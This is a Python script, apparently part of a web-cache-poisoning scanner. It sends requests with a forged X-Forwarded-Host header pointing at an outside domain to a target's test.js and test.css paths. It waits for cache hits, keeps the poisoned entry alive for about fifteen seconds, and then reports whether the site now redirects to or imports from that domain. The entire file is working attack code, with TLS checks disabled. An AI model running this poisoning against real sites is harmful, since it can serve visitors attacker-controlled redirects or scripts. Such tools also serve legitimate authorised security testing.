#! /usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import traceback

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


params = {
	    'cp': '1337',
		}

def get_hit(url, matching_forward):
	#web cache poisoning to exploit unsafe handling of resource imports
	headers = {
	    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
	    'X-Forwarded-Host': matching_forward,
		}

	res_header = {}
	#print(" - {}?cp={}".format(url, params["cp"])) #Debug

	for i in range(10):
		res = requests.get(url, params=params, headers=headers, verify=False, allow_redirects=False)
		for cs in res.headers:
			if "Cache-Status" in cs or "X-Cache" in cs or "x-drupal-cache" in cs or "X-Proxy-Cache" in cs or "X-HS-CF-Cache-Status" in cs:
				#print(res.headers) #Debug
				if "hit" in res.headers[cs].lower():
					#print("HEADSHOT !!!") #Debug
					res_header = res.headers
			if res_header:
				if "age" in cs.lower():
					#To keep the potential cache poisoning ~15scd
					header_age = 0
					while int(header_age) < 15:
						#print(header_age) #Debug
						#print(res.headers[cs]) #Debug
						res = requests.get(url, params=params, headers=headers, verify=False, allow_redirects=False)
						header_age = res.headers[cs].lower()

	#print(res_header) #Debug
	return res_header


def wcp_import(url, matching_forward):
	print(" --├ {}?cp={} have HIT Cache-Status".format(url, params["cp"]))

	url_param = "{}?cp={}".format(url, params["cp"])

	req_verify_redirect = requests.get(url, params=params, verify=False)
	req_verify_url = requests.get(url_param, verify=False, allow_redirects=True)

	if req_verify_redirect.status_code in [301, 302] or req_verify_url.status_code in [301, 302]:
		if matching_forward in req_verify_redirect.url or matching_forward in req_verify_url.url:
			print("  \033[31m └── Cache poisoning on {} seem work, the redirection to \"ndvyepenbvtidpvyzh.com\" seems work ! \033[0m".format(url_param))

	elif matching_forward in req_verify_redirect.text or matching_forward in req_verify_url.text:
		print("  \033[31m └── Cache poisoning on {} seem work, double-check on the page to see if \"ndvyepenbvtidpvyzh.com\" is staying and have fun ! \033[0m".format(url_param))
	#print(req_verify_redirect.status_code) #Debug


def check_cache_files(uri):


	matching_forward = "ndvyepenbvtidpvyzh.com"

	for endpoints in ["test.js", "test.css"]:
		url = "{}{}".format(uri, endpoints)
		try:
			valid_hit = get_hit(url, matching_forward)
			if valid_hit:
				wcp_import(url, matching_forward)
		except:
			print(" ! Error with {}".format(url))